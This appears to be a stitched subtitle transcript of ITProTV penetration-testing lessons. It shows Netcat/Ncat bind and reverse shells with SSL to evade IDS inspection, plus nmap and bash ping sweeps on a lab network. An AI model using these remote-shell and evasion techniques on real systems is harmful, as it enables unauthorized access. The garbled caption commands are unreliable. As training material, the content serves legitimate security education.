00:31:57.899\nSo I'll just zoom in a little bit.\n\n632\n00:31:57.899 --> 00:32:00.174\nDon't want you to miss the action.\n\n633\n00:32:00.174 --> 00:32:02.473\nThere we go, that should be helpful.\n\n634\n00:32:02.473 --> 00:32:05.921\nSo NC, we just trying to,\nI can use Net Cat for this.\n\n635\n00:32:05.921 --> 00:32:07.256\nVery simple.\n\n636\n00:32:07.256 --> 00:32:10.640\nNC-NV.\n\n637\n00:32:10.640 --> 00:32:15.411\nWhatever the IP address is,\n102.168.209.146.\n\n638\n00:32:15.411 --> 00:32:16.691\nAnd then of course my port.\n\n639\n00:32:16.691 --> 00:32:21.190\nI create a connection, LS-AL.\n\n640\n00:32:21.190 --> 00:32:21.810\nHere we go.\n\n641\n00:32:21.810 --> 00:32:23.240\nJust like we saw before.\n\n642\n00:32:23.240 --> 00:32:26.590\nBut what happens if, let's see here.\n\n643\n00:32:26.590 --> 00:32:31.650\nLet me jump over to my, hello.\n\n644\n00:32:31.650 --> 00:32:36.783\nLet's bring my terminal up here and\n\n645\n00:32:36.783 --> 00:32:42.950\nI try it from here, I wonder what happens.\n\n646\n00:32:42.950 --> 00:32:45.006\nNC-NV 192.168.219.146.\n\n647\n00:32:46.190 --> 00:32:49.520\nOn port 99999.\nLook at that.\n\n648\n00:32:49.520 --> 00:32:50.830\nConnection refused.\n\n649\n00:32:50.830 --> 00:32:51.850\nSo I've white listed.\n\n650\n00:32:51.850 --> 00:32:52.690\nI can't come from there.\n\n651\n00:32:52.690 --> 00:32:54.800\nThe only person that's allowed\nto make the connection.\n\n652\n00:32:54.800 --> 00:32:58.390\nSo one of the advantages of using MCAT.\n\n653\n00:32:58.390 --> 00:32:59.890\nAlso the other one was encryption.\n\n654\n00:32:59.890 --> 00:33:01.305\nSo let's take a look at that.\n\n655\n00:33:01.305 --> 00:33:04.459\nI will Control-C this connection.\n\n656\n00:33:04.459 --> 00:33:07.040\nWe'll basically rebuild it.\n\n657\n00:33:08.635 --> 00:33:10.700\nAnd, what do you have to do?\n\n658\n00:33:10.700 --> 00:33:13.630\nYou have to just define\nwhat it is you want to do.\n\n659\n00:33:13.630 --> 00:33:16.620\n-SSL, that's SSL encryption.\n\n660\n00:33:16.620 --> 00:33:18.160\nThrow that on the end there.\n\n661\n00:33:18.160 --> 00:33:21.770\nI could take that white list out,\nbut I'll leave it there for brevity.\n\n662\n00:33:21.770 --> 00:33:23.900\nWhat am I missing here.\n\n663\n00:33:23.900 --> 00:33:26.602\nOkay dash l and dash s are incompatible.\n\n664\n00:33:26.602 --> 00:33:27.854\nIs it now?\n\n665\n00:33:27.854 --> 00:33:29.376\nIs that a fact?\n\n666\n00:33:29.376 --> 00:33:31.662\nLet's see here.\n\n667\n00:33:31.662 --> 00:33:33.744\nWhy is it telling me this?\n\n668\n00:33:33.744 --> 00:33:41.570\n&gt;&gt; Let's see here, protocol SSL,\nas a command to set up the server somehow.\n\n669\n00:33:41.570 --> 00:33:47.130\n&gt;&gt; Yeah, it's saying it doesn't like\nthe dash l to listen for SSL connections.\n\n670\n00:33:48.610 --> 00:33:51.190\nSo this is annoying.\n\n671\n00:33:51.190 --> 00:33:53.660\nIt should have done this.\n\n672\n00:33:53.660 --> 00:33:54.810\nIt should have worked.\n\n673\n00:33:54.810 --> 00:33:55.835\nWhy is it not working?\n\n674\n00:33:55.835 --> 00:33:57.190\nNLVP, it doesn't like the dash.\n\n675\n00:33:57.190 --> 00:33:58.860\nI don't remember that being the case.\n\n676\n00:33:59.950 --> 00:34:03.150\nYeah, that's what I thought.\n\n677\n00:34:03.150 --> 00:34:04.170\nThere's the problem.\n\n678\n00:34:04.170 --> 00:34:06.380\nAgain, it's the little\nthings that kill you.\n\n679\n00:34:06.380 --> 00:34:08.470\n&gt;&gt; [LAUGH]\n&gt;&gt; And it's two dashes for\n\n680\n00:34:08.470 --> 00:34:11.680\nSSL, much like the --allow.\n\n681\n00:34:11.680 --> 00:34:14.820\nBut in my notes I was an idiot and\nforgot to put the second dash.\n\n682\n00:34:14.820 --> 00:34:17.590\nSo when I'm trying to remind\nmyself of what to put here.\n\n683\n00:34:17.590 --> 00:34:20.110\nThere you go, we hit Return now hey,\nlook at that.\n\n684\n00:34:20.110 --> 00:34:24.100\nThings start working as they're supposed\nto because I'm using the correct command.\n\n685\n00:34:24.100 --> 00:34:24.930\nSo let's jump back.\n\n686\n00:34:24.930 --> 00:34:26.839\nWe'll zoom in for you guys.\n\n687\n00:34:28.570 --> 00:34:31.740\nAnd make our connection now.\n\n688\n00:34:31.740 --> 00:34:35.780\nHere you cannot use the regular net cap.\n\n689\n00:34:35.780 --> 00:34:41.870\nBecause encryption is in play, net cap\ndoes not use encryption, N-cat does.\n\n690\n00:34:41.870 --> 00:34:44.390\nSo if you want an encrypted connection,\n\n691\n00:34:44.390 --> 00:34:48.380\nyou have to use N-cat on\nboth sides of the equation.\n\n692\n00:34:48.380 --> 00:34:53.490\nOkay, so just a little safety tip for\nyou there.\n\n693\n00:34:53.490 --> 00:34:56.554\nSo I have to use N-cat,\n\n694\n00:34:56.554 --> 00:35:02.082\nwhich we saw earlier was in my system 32.\n\n695\n00:35:02.082 --> 00:35:05.440\nAnd then -V19216v.219@146 on port 999,\nand --ssl.\n\n696\n00:35:05.440 --> 00:35:07.060\nThere's our connection.\n\n697\n00:35:07.060 --> 00:35:09.520\nMove that over a little,\na little bit there.\n\n698\n00:35:10.920 --> 00:35:12.070\nLittle lower.\n\n699\n00:35:12.070 --> 00:35:14.200\nAnd we do our LS and there we go.\n\n700\n00:35:14.200 --> 00:35:17.870\nWe start to get all the goodness\nthat we know and love.\n\n701\n00:35:17.870 --> 00:35:23.640\nSo there you go, that's basically creating\na reverse shell, creating a bind shell.\n\n702\n00:35:23.640 --> 00:35:25.410\nYou need to know the difference\nbetween the two.\n\n703\n00:35:25.410 --> 00:35:28.365\nDo not worry we will not be\nusing N-cat at all any more.\n\n704\n00:35:28.365 --> 00:35:29.920\n&gt;&gt; [LAUGH]\n&gt;&gt; I have no reason to\n\n705\n00:35:29.920 --> 00:35:31.910\nencrypt any of this traffic.\n\n706\n00:35:31.910 --> 00:35:33.780\nYou might have a reason\nto encrypt traffic,\n\n707\n00:35:33.780 --> 00:35:36.780\nyou might have reason\nto white list things.\n\n708\n00:35:36.780 --> 00:35:39.960\nSo there are good reasons to use N-cat.\n\n709\n00:35:39.960 --> 00:35:43.300\nEncryption is great especially when you\ntrying to work through firewalls and\n\n710\n00:35:43.300 --> 00:35:44.930\nit's inspecting traffic.\n\n711\n00:35:44.930 --> 00:35:49.000\nMaybe you'll want to employ in\nthat from N-cat from time to time.\n\n712\n00:35:49.000 --> 00:35:51.360\nSo don't forget that it's there,\nbut I think for\n\n713\n00:35:51.360 --> 00:35:54.080\nthe entirety of the show we're\nnot going to do any of that so.\n\n714\n00:35:54.080 --> 00:35:58.460\n&gt;&gt; Keep the prying eyes of those IDS's and\nIPS's out of your traffic right?\n\n715\n00:35:58.460 --> 00:36:00.670\n&gt;&gt; They are snoopy little\nthings aren't they?\n\n716\n00:36:00.670 --> 00:36:02.310\nThey love to look at what you're doing.\n\n717\n00:36:02.310 --> 00:36:04.160\nI'm trying to break into computers here.\n\n718\n00:36:04.160 --> 00:36:07.440\n&gt;&gt; That's right and as we said I think in\nthe beginning most of these tools were\n\n719\n00:36:07.440 --> 00:36:13.160\ndesigned as administrative tools and then\nwe've repurposed them to do other things.\n\n720\n00:36:13.160 --> 00:36:17.300\nSo as an administrator you\nmight use N-cat to manage some\n\n721\n00:36:17.300 --> 00:36:20.990\nof your servers within your environment\nand you want to encrypt that traffic.\n\n722\n00:36:20.990 --> 00:36:24.584\nAs you don't want any user running\nsniffers and seeing any of those commands\n\n723\n00:36:24.584 --> 00:36:27.856\nor possibly passwords and\nwhatever else you might be transmitting.\n\n724\n00:36:27.856 --> 00:36:31.132\nSo definitely you use for that\nencryption in there, but as Daniel said,\n\n725\n00:36:31.132 --> 00:36:34.100\na lot of the hackers,\nthey're not spending any time doing that.\n\n726\n00:36:34.100 --> 00:36:36.110\nIt's straight to good old Netcat.\n\n727\n00:36:36.110 --> 00:36:38.600\n&gt;&gt; Yeah, I don't want to\nover-complicate things for you guys,\n\n728\n00:36:38.600 --> 00:36:42.900\nas you saw it can get really,\nwhen you're like did I use Netcat for\n\n729\n00:36:42.900 --> 00:36:45.830\nthis or N-cat for this, I don't remember.\n\n730\n00:36:45.830 --> 00:36:49.960\nAnd we're gonna keep it easy,\nwe're just gonna use Netcat for\n\n731\n00:36:49.960 --> 00:36:51.960\nthe rest of the series.\n\n732\n00:36:51.960 --> 00:36:55.550\n&gt;&gt; Alright, fantastic look Daniel there at\nthe different types of shells that we're\n\n733\n00:36:55.550 --> 00:36:56.580\ngoing to be working with.\n\n734\n00:36:56.580 --> 00:36:57.320\nRemote shells.\n\n735\n00:36:57.320 --> 00:36:58.650\nWe've looked at bind.\n\n736\n00:36:58.650 --> 00:37:00.070\nAs well as the reverse, right?\n\n737\n00:37:00.070 --> 00:37:03.510\nBind when you are binding your\nshell to a port number so\n\n738\n00:37:03.510 --> 00:37:07.350\nsome other node on the network can reach\nout to that port and basically have any\n\n739\n00:37:07.350 --> 00:37:11.910\ncommands sent to the shell and\noutput sent back out across there.\n\n740\n00:37:11.910 --> 00:37:14.810\nWe also looked at creating\nsome reverse shells\n\n741\n00:37:14.810 --> 00:37:18.320\nwhere you're shoveling shells\nout to the other system.\n\n742\n00:37:18.320 --> 00:37:21.950\nA lot of the times this is used as you\nwere saying when you've got firewalls to\n\n743\n00:37:21.950 --> 00:37:26.020\ndeal with or private ip address\nranges where I can't type in.\n\n744\n00:37:26.020 --> 00:37:30.270\nI can't connect to 10.1.1.1\nif that's a remote network,\n\n745\n00:37:30.270 --> 00:37:31.360\nif it's not on the same network as me,\n\n746\n00:37:31.360 --> 00:37:36.540\nbut I can do a reverse shell into\na private IP address, so, great usage for\n\n747\n00:37:36.540 --> 00:37:40.470\nboth of those and we'll see both of those\nthroughout these episodes, I'm sure.\n\n748\n00:37:40.470 --> 00:37:42.050\nSo we thank you for\nthat Daniel, we appreciate it.\n\n749\n00:37:42.050 --> 00:37:42.980\nGreat look there.\n\n750\n00:37:42.980 --> 00:37:45.060\nHope everybody out there\nenjoyed watching this one.\n\n751\n00:37:45.060 --> 00:37:47.910\nSigning off for ITProTV,\nI've been your host, Mike Roderick.\n\n752\n00:37:47.910 --> 00:37:48.670\n&gt;&gt; And I'm Daniel Lowry.\n\n753\n00:37:48.670 --> 00:37:49.670\n&gt;&gt; And we'll see you next time.\n\n754\n00:37:49.670 --> 00:37:57.386\n[MUSIC]\n\n755\n00:37:57.386 --> 00:37:59.361\nThank you for watching ITProTV.\n\n",

00:00:08.354\n[MUSIC]\n\n4\n00:00:08.354 --> 00:00:12.635\n&gt;&gt; You're watching ITProTV.\n\n5\n00:00:12.635 --> 00:00:15.635\nHello, Welcome to another\nexciting episode here at ITProTV.\n\n6\n00:00:15.635 --> 00:00:19.405\nI am your host Mike Roderick and today\nwe are doing our penetration testing.\n\n7\n00:00:19.405 --> 00:00:23.315\nAnd in this episode we are gonna\nfocus in on a very important\n\n8\n00:00:23.315 --> 00:00:27.675\npart of the hacking lifecycle;\nscanning and enumeration.\n\n9\n00:00:27.675 --> 00:00:30.860\nAnd here to guide us through\nthis phase is Mr. Daniel Lowery.\n\n10\n00:00:30.860 --> 00:00:31.656\nWelcome back Daniel.\n\n11\n00:00:31.656 --> 00:00:33.245\n&gt;&gt; Mike, so glad to be back.\n\n12\n00:00:33.245 --> 00:00:35.915\nAlways enjoy coming here to ITProTV.\n\n13\n00:00:35.915 --> 00:00:37.460\nOur jobs do kind of rock.\n\n14\n00:00:37.460 --> 00:00:39.438\nIf you have a nervous\n[INAUDIBLE] watching.\n\n15\n00:00:39.438 --> 00:00:40.080\n&gt;&gt; Don't do that.\n&gt;&gt; Yes.\n\n16\n00:00:40.080 --> 00:00:41.225\nIt keeps on downloading.\n\n17\n00:00:41.225 --> 00:00:42.290\n&gt;&gt; [INAUDIBLE]\n&gt;&gt; We had a lot of fun.\n\n18\n00:00:42.290 --> 00:00:45.190\nAnd today is no exception to that rule.\n\n19\n00:00:45.190 --> 00:00:46.200\nWe are gonna have a lot of fun.\n\n20\n00:00:46.200 --> 00:00:49.950\nWe are gonna learn about scanning and\nenumeration as Mike said.\n\n21\n00:00:49.950 --> 00:00:52.230\nWe wanna take a minute.\n\n22\n00:00:52.230 --> 00:00:54.520\nWe wanna bring it down.\n\n23\n00:00:54.520 --> 00:01:01.184\nBecause scanning and enumeration can\nbe probably the most monotonous.\n\n24\n00:01:01.184 --> 00:01:02.462\nAs if I can be nice to it.\n\n25\n00:01:02.462 --> 00:01:06.600\n&gt;&gt; [LAUGH]\n&gt;&gt; A portion of the phase of getting into\n\n26\n00:01:06.600 --> 00:01:07.130\na system.\n\n27\n00:01:08.400 --> 00:01:13.150\nBut it's also probably one of the most\nimportant phases of getting into a system.\n\n28\n00:01:13.150 --> 00:01:15.590\nI fell into this trap\nearly on as I became.\n\n29\n00:01:15.590 --> 00:01:16.920\nCuz I wanna go.\n\n30\n00:01:16.920 --> 00:01:17.680\nI wanna get in.\n\n31\n00:01:17.680 --> 00:01:19.220\nJust show me how to get in.\n\n32\n00:01:19.220 --> 00:01:22.220\nJust show me where's the, and then I go.\n\n33\n00:01:22.220 --> 00:01:24.040\nBut unfortunately that's\nnot the way it is.\n\n34\n00:01:24.040 --> 00:01:26.960\nYou need to spend time\nhere learning scant.\n\n35\n00:01:26.960 --> 00:01:31.060\nFiguring out where the holes are so\nthat you might exploit them.\n\n36\n00:01:31.060 --> 00:01:33.310\nBecause if you don't find the right whole,\n\n37\n00:01:33.310 --> 00:01:35.868\nyou are not gonna be able to\nuse a vulnerability against it.\n\n38\n00:01:35.868 --> 00:01:39.940\nRight, you gotta find where the weaknesses\nare and this is where it stands.\n\n39\n00:01:39.940 --> 00:01:41.300\nScanning and enumeration.\n\n40\n00:01:41.300 --> 00:01:44.211\nSo what I'm gonna do today,\nis I'm gonna show you some ways in which\n\n41\n00:01:44.211 --> 00:01:47.260\nyou ca do that, some good tools\nthat will help you to do that.\n\n42\n00:01:47.260 --> 00:01:50.380\nSome ways in which you can do\nthat your own self, right?\n\n43\n00:01:50.380 --> 00:01:51.990\nManually.\n\n44\n00:01:51.990 --> 00:01:54.890\nAnd get the information necessary so that\n\n45\n00:01:54.890 --> 00:01:59.680\nyou might find those weaknesses in those\nsystems, so later on we can exploit them.\n\n46\n00:01:59.680 --> 00:02:02.220\nAll right, so let's see,\nwhere do we wanna start here?\n\n47\n00:02:02.220 --> 00:02:03.180\nWhat is scanning?\n\n48\n00:02:03.180 --> 00:02:03.930\nWhat is enumeration?\n\n49\n00:02:03.930 --> 00:02:07.960\nObviously, scanning is a really easy\nterm to figure out, it's basically,\n\n50\n00:02:07.960 --> 00:02:12.580\nwe're using some automated\npiece of program, or\n\n51\n00:02:12.580 --> 00:02:16.110\nan automated program,\nto do something for us.\n\n52\n00:02:16.110 --> 00:02:17.990\nTo look for things.\n\n53\n00:02:17.990 --> 00:02:19.830\nBasically that's what we mean scan.\n\n54\n00:02:19.830 --> 00:02:23.210\nGo to this machine and\nfind out what it's doing.\n\n55\n00:02:23.210 --> 00:02:24.870\nGo to this machine and\nfind out what it's doing.\n\n56\n00:02:24.870 --> 00:02:25.500\nGo to the next one.\n\n57\n00:02:25.500 --> 00:02:29.570\nDo the same thing and same thing, so that\nI don't have to do that myself, right?\n\n58\n00:02:29.570 --> 00:02:30.820\nThat's what we mean of scanning.\n\n59\n00:02:30.820 --> 00:02:33.740\nScanning can also be,\nwhere are the machines?\n\n60\n00:02:33.740 --> 00:02:35.270\nWhat machines are out there?\n\n61\n00:02:35.270 --> 00:02:36.420\nWhat is those machines name?\n\n62\n00:02:36.420 --> 00:02:38.080\nWhat is their ip address?\n\n63\n00:02:38.080 --> 00:02:39.440\nThings of that nature, right?\n\n64\n00:02:39.440 --> 00:02:42.520\nSo that's the information that we're\ngathering when it comes to scanning.\n\n65\n00:02:42.520 --> 00:02:48.280\nEnumeration is a little more like figuring\nout, okay, I know port 80 is open.\n\n66\n00:02:48.280 --> 00:02:50.190\nWhat on port 80 is running, right?\n\n67\n00:02:50.190 --> 00:02:53.020\nSo we're enumerating that information.\n\n68\n00:02:53.020 --> 00:02:56.890\nIt's Apache version 4.2,\nsomething to that, right?\n\n69\n00:02:56.890 --> 00:02:58.116\nThat's what we're doing.\n\n70\n00:02:58.116 --> 00:03:02.300\nSo we'd use a lot of interesting\ntools that will help us do that.\n\n71\n00:03:02.300 --> 00:03:07.010\nWe're also gonna talk about a lot of\ninteresting tools that we're not gonna use\n\n72\n00:03:07.010 --> 00:03:11.350\nbecause I want you guys to be able to do\nit the hard way to be honest with you.\n\n73\n00:03:11.350 --> 00:03:14.880\nBecause it will help you\nunderstand better what's going on.\n\n74\n00:03:14.880 --> 00:03:18.160\nNot that we're not gonna use tools,\nwe're just not gonna use the easy tools.\n\n75\n00:03:18.160 --> 00:03:19.960\n&gt;&gt; Dang it Daniel,\njust like my math teacher.\n\n76\n00:03:19.960 --> 00:03:24.125\nAlways made me learn the long way\nbefore they would show us the shortcut.\n\n77\n00:03:24.125 --> 00:03:25.510\nSounds like what you're doing here.\n\n78\n00:03:25.510 --> 00:03:26.702\n&gt;&gt; See me after class Mike.\n\n79\n00:03:26.702 --> 00:03:29.126\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm watching you, young man.\n\n80\n00:03:29.126 --> 00:03:31.570\nThat's right.\nAll right, so there we're having some fun.\n\n81\n00:03:31.570 --> 00:03:37.040\nOkay, so some of the information gathering\nprocess that we can automate is obviously,\n\n82\n00:03:37.040 --> 00:03:42.660\nhost discovery, service enumeration and\nthe most important, vulnerability.\n\n83\n00:03:42.660 --> 00:03:45.690\nYes, that's what we're looking for,\nvulnerabilities.\n\n84\n00:03:45.690 --> 00:03:47.310\nSo let's talk about host discovery.\n\n85\n00:03:47.310 --> 00:03:50.810\nHow do we ind hosts on whatever\nnetwork we are connected to.\n\n86\n00:03:50.810 --> 00:03:54.165\nWe are talking the internet,\nthat's a big monkey,\n\n87\n00:03:54.165 --> 00:03:58.630\nthat's a lot of hosts,\ntons of them are out there.\n\n88\n00:03:58.630 --> 00:04:03.250\nAnd even beyond that, that you can see\nper say from Internet IP addresses,\n\n89\n00:04:03.250 --> 00:04:08.550\nour private IP addresses,\ninside of private LANs that are connected\n\n90\n00:04:08.550 --> 00:04:12.740\nto maybe one internet connection that\nmight have 20 machines on the other side.\n\n91\n00:04:12.740 --> 00:04:13.920\nWell, what machines are that?\n\n92\n00:04:13.920 --> 00:04:18.400\nIf I can get into that network, if I can\nwalk into a building and get access to\n\n93\n00:04:18.400 --> 00:04:23.700\ntheir WiFi which connects me to a network\nwhere I can plug in a Cat 6 cable\n\n94\n00:04:23.700 --> 00:04:27.350\ninto my computer and now I have at least\nsome sort of connection to a network.\n\n95\n00:04:27.350 --> 00:04:30.750\nI wanna find out what else is out there.\n\n96\n00:04:30.750 --> 00:04:34.620\nNow, if you're watching this show,\nI'm hoping you have, we talked about\n\n97\n00:04:34.620 --> 00:04:39.180\nfundamental Ideas and concepts that\nyou already need to have a grasp of.\n\n98\n00:04:39.180 --> 00:04:42.200\nOne of them I'm gonna assume\nthat you know how to use ping.\n\n99\n00:04:42.200 --> 00:04:42.920\nPing is a great tool.\n\n100\n00:04:42.920 --> 00:04:46.100\nPing this machine, ping that,\nping a range of machines.\n\n101\n00:04:46.100 --> 00:04:46.610\nWe can do that.\n\n102\n00:04:46.610 --> 00:04:47.190\nIt's a great tool.\n\n103\n00:04:47.190 --> 00:04:48.730\nYou can use that.\n\n104\n00:04:48.730 --> 00:04:51.010\nThat's an automated tool\nthat does that job.\n\n105\n00:04:51.010 --> 00:04:51.980\nIt will scan.\n\n106\n00:04:51.980 --> 00:04:58.030\nYou can write a script to\nsearch out an IP range, right?\n\n107\n00:04:58.030 --> 00:04:59.310\nMake that happen.\n\n108\n00:04:59.310 --> 00:05:01.693\nYou can obviously use third\nparty tools like nmap,\n\n109\n00:05:01.693 --> 00:05:04.476\nanything else that you'd like\nthat will do that function.\n\n110\n00:05:05.682 --> 00:05:07.399\nLet's take a look at some of that,\n\n111\n00:05:07.399 --> 00:05:10.490\nlet's take a look at nmap cuz\nnmap is kinda the gold standard.\n\n112\n00:05:10.490 --> 00:05:13.680\nIt is something that if you are not\nusing as a penetration tester,\n\n113\n00:05:13.680 --> 00:05:15.890\nI would suggest using.\n\n114\n00:05:15.890 --> 00:05:20.270\nIt's not absolutely,\nper se, necessary, but\n\n115\n00:05:20.270 --> 00:05:24.450\nman does it do a great job, and a lot\nof people like it for that very reason.\n\n116\n00:05:24.450 --> 00:05:25.710\nAre there scanners that are faster?\n\n117\n00:05:25.710 --> 00:05:27.765\nThere sure are but\n\n118\n00:05:27.765 --> 00:05:33.350\nnmap really earns its money by being\nthorough and consistent, right.\n\n119\n00:05:33.350 --> 00:05:36.030\nSo, you might get a faster\nscan out of somebody else but\n\n120\n00:05:36.030 --> 00:05:40.450\nyou might not get as\nconsistently reliable results.\n\n121\n00:05:40.450 --> 00:05:44.300\nSo, I'll hail the Nmap\nin my humble opinion.\n\n122\n00:05:44.300 --> 00:05:45.460\n&gt;&gt; I'll second that.\n\n123\n00:05:45.460 --> 00:05:46.650\n&gt;&gt; Yeah, Mikey's second it.\n\n124\n00:05:46.650 --> 00:05:50.210\nI'm pretty sure I'm hearing a lot of\naye coming from around the world,\n\n125\n00:05:50.210 --> 00:05:52.070\nas anybody's hearing this right now.\n\n126\n00:05:52.070 --> 00:05:53.660\nOkay, so let's do that, let's do Nmap.\n\n127\n00:05:53.660 --> 00:05:59.240\nLet's take a look at my machine, show\nyou how to do a ping scan of a IP range.\n\n128\n00:05:59.240 --> 00:06:06.550\nSo just invoke in nmap -sn,\nit used to be sp, like this.\n\n129\n00:06:06.550 --> 00:06:07.340\nThat's no more.\n\n130\n00:06:07.340 --> 00:06:12.310\nNow it's -n like that, sp will still\nwork though, so you can use that.\n\n131\n00:06:12.310 --> 00:06:16.550\nIf you're old school, you're like, I'm not\ngiving up my nmap version 4.2, good for\n\n132\n00:06:16.550 --> 00:06:17.390\nyou, sir.\n\n133\n00:06:17.390 --> 00:06:18.430\nContinue the good fight.\n\n134\n00:06:18.430 --> 00:06:22.640\nBut I'm on 7.3 and\nsn is the way it goes now.\n\n135\n00:06:22.640 --> 00:06:25.062\nSo sn, and then give it your IP range.\n\n136\n00:06:25.062 --> 00:06:29.926\n192.168.219., just whatever IP address,\nand\n\n137\n00:06:29.926 --> 00:06:36.015\nthen just do that siter /24/16,\n32, whatever it is you're using.\n\n138\n00:06:36.015 --> 00:06:38.185\nNot 32, you would have no hosts at all.\n\n139\n00:06:38.185 --> 00:06:40.020\n&gt;&gt; [LAUGH]\n&gt;&gt; But\n\n140\n00:06:40.020 --> 00:06:44.250\nthe good old 24s and\nthe 16s happen quite often.\n\n141\n00:06:44.250 --> 00:06:46.259\nSo just throw that notation on the end.\n\n142\n00:06:46.259 --> 00:06:48.635\nHit Enter.\n\n143\n00:06:48.635 --> 00:06:51.670\nAnd it works and\ngrinds as Mike likes to say.\n\n144\n00:06:51.670 --> 00:06:54.530\nAnd look it found a few\nmachines on this network.\n\n145\n00:06:54.530 --> 00:06:56.270\nI found that 146 was up.\n\n146\n00:06:56.270 --> 00:06:57.270\nThat's my Kali Linux.\n\n147\n00:06:57.270 --> 00:06:59.680\n152, don't know what that is.\n\n148\n00:06:59.680 --> 00:07:02.550\n168, there's my Windows machine.\n\n149\n00:07:02.550 --> 00:07:04.930\nNow I've done a really good job\nof finding out very quickly,\n\n150\n00:07:04.930 --> 00:07:08.070\nthat ran out in 2.79 seconds.\n\n151\n00:07:08.070 --> 00:07:11.660\nSo yeah maybe you could have done it\nin 1.79 seconds with another scanner.\n\n152\n00:07:12.700 --> 00:07:14.110\nMan, good for you, good for you.\n\n153\n00:07:14.110 --> 00:07:19.300\nAnd I know the seconds do tend to count,\nbut I just don't see the issue and.\n\n154\n00:07:19.300 --> 00:07:19.810\nCan also,\n\n155\n00:07:19.810 --> 00:07:24.370\nlike I said you can create maybe a custom\nscript that will do this using ping.\n\n156\n00:07:24.370 --> 00:07:26.490\nLet's go over to Kali.\n\n157\n00:07:26.490 --> 00:07:29.310\nI have created a custom\nscript to do that very thing.\n\n158\n00:07:29.310 --> 00:07:30.215\nHere is is right here.\n\n159\n00:07:30.215 --> 00:07:33.180\npsweep.sh, let's take a look at that.\n\n160\n00:07:33.180 --> 00:07:38.861\nCat p, I'll do a nano so\nwe get the colors, psweep.\n\n161\n00:07:38.861 --> 00:07:40.730\nNot a very long script.\n\n162\n00:07:40.730 --> 00:07:42.712\nIt's a very short script, very easy.\n\n163\n00:07:42.712 --> 00:07:47.150\nThis Kali box, for whatever reason,\ngives me headaches with the script.\n\n164\n00:07:47.150 --> 00:07:48.265\nIt does not like the script.\n\n165\n00:07:48.265 --> 00:07:50.630\n&gt;&gt; [LAUGH]\n&gt;&gt; Every other box that I created this on,\n\n166\n00:07:50.630 --> 00:07:51.660\nit works fantastic.\n\n167\n00:07:51.660 --> 00:07:53.600\nBut this one, it just hates it.\n\n168\n00:07:53.600 --> 00:07:55.853\nBut basically all I'm doing is a for-loop.\n\n169\n00:07:55.853 --> 00:07:59.932\nSo for, this variable, and\nsequence 1 through 254.\n\n170\n00:07:59.932 --> 00:08:01.228\nSo I'm scanning a range.\n\n171\n00:08:01.228 --> 00:08:05.892\nFrom 1 to 254 just sounds like\na class C address for me.\n\n172\n00:08:05.892 --> 00:08:07.860\nI could change it to whatever I want.\n\n173\n00:08:07.860 --> 00:08:10.080\nI'm doing this sleep because\nbasically it's running so\n\n174\n00:08:10.080 --> 00:08:11.650\nfast it's confusing the CPU.\n\n175\n00:08:11.650 --> 00:08:13.540\n&gt;&gt; It'll trip over itself basically.\n\n176\n00:08:13.540 --> 00:08:17.720\n&gt;&gt; Yeah, it's dragging its tongue and\nits ears and it's tripping over it.\n\n177\n00:08:17.720 --> 00:08:19.590\nSo I sleep it for\na very short amount of time so\n\n178\n00:08:19.590 --> 00:08:22.070\nit has enough time to keep processing.\n\n179\n00:08:22.070 --> 00:08:24.920\nAnd then it's just a ping -c,\na continuous ping.\n\n180\n00:08:24.920 --> 00:08:27.010\nHow many, or\nI'm sorry not continuous, the count.\n\n181\n00:08:27.010 --> 00:08:27.970\nHow many pings do I wanna do?\n\n182\n00:08:27.970 --> 00:08:29.800\nI just wanna do one.\n\n183\n00:08:29.800 --> 00:08:32.810\nAnd then it gets its variable here.\n\n184\n00:08:32.810 --> 00:08:36.730\nI grep that, I'm looking for\n64 because when I do a ping,\n\n185\n00:08:36.730 --> 00:08:41.000\n64 is the very first character\nthat shows up on a good ping.\n\n186\n00:08:41.000 --> 00:08:45.140\nSo if it replies, that's the very first\ncharacter, that's what grep is happening.\n\n187\n00:08:45.140 --> 00:08:48.710\nIf the line starts with 64, good.\n\n188\n00:08:48.710 --> 00:08:55.050\nCut the field which is just an empty, like\na space, and what field, it's number four.\n\n189\n00:08:55.050 --> 00:08:58.010\nAnd then throw that process in the\nbackground so that I can run another one,\n\n190\n00:08:58.010 --> 00:08:58.760\nand I'm doing this as a loop.\n\n191\n00:08:58.760 --> 00:09:03.122\nSo that's my little scripts,\nlet's see if it actually gives me fits or\n\n192\n00:09:03.122 --> 00:09:05.171\nwhat, hopefully it runs right.\n\n193\n00:09:05.171 --> 00:09:08.998\nI've got it down to running about\nseven seconds, it's not n-map fast.\n\n194\n00:09:08.998 --> 00:09:10.090\nBut it's not too bad.\n\n195\n00:09:10.090 --> 00:09:10.660\n&gt;&gt; It's pretty close.\n\n196\n00:09:10.660 --> 00:09:12.815\n&gt;&gt; Yeah it's about as fast I've done it,\nso let's do that.\n\n197\n00:09:12.815 --> 00:09:14.744\n/pingsweep.sh.\n\n198\n00:09:14.744 --> 00:09:17.330\nPingsweep where's my s?\n\n199\n00:09:17.330 --> 00:09:17.870\nThere it is.\n\n200\n00:09:17.870 --> 00:09:20.770\nThere it goes, firing away.\n\n201\n00:09:20.770 --> 00:09:24.360\nPlease don't crash on me my little script,\nwork for me.\n\n202\n00:09:24.360 --> 00:09:25.160\nIt's going, it's going.\n\n203\n00:09:25.160 --> 00:09:25.890\nHey it found, all right.\n\n204\n00:09:25.890 --> 00:09:28.893\nCome on, I know there's one more,\nthere we go.\n\n205\n00:09:28.893 --> 00:09:31.010\nSo it found a couple of IP addresses.\n\n206\n00:09:31.010 --> 00:09:33.660\nI notice one it did not find,\nwhich one was it?\n\n207\n00:09:33.660 --> 00:09:36.610\nThat must have been an old entry or\nsomething.\n\n208\n00:09:36.610 --> 00:09:44.041\nLet's see, ping 192.168.219.152.\n\n209\n00:09:44.041 --> 00:09:46.240\nIt did find that one,\nyeah, so it's not up.\n\n210\n00:09:46.240 --> 00:09:50.780\nSo I must have had like an ARP,\nit must have been an ARP thing with NMAP.\n\n211\n00:09:50.780 --> 00:09:53.660\nYou've got to remember\nNMAP tries to be thorough.\n\n212\n00:09:53.660 --> 00:09:56.920\nIt looked at my ARP table and\nsaid well, you connected this earlier.\n\n213\n00:09:56.920 --> 00:09:58.930\nI assume it's still alive.\n\n214\n00:09:58.930 --> 00:09:59.910\nAnd there you go.\n\n215\n00:09:59.910 --> 00:10:02.880\nSo maybe you want to go\nwith a custom script,\n\n216\n00:10:02.880 --> 00:10:06.420\nbecause I got only the machines\nthat are actually alive.\n\n217\n00:10:06.420 --> 00:10:09.270\nAnd I had to tell it,\ndon't do ARP, only do ping.\n\n218\n00:10:09.270 --> 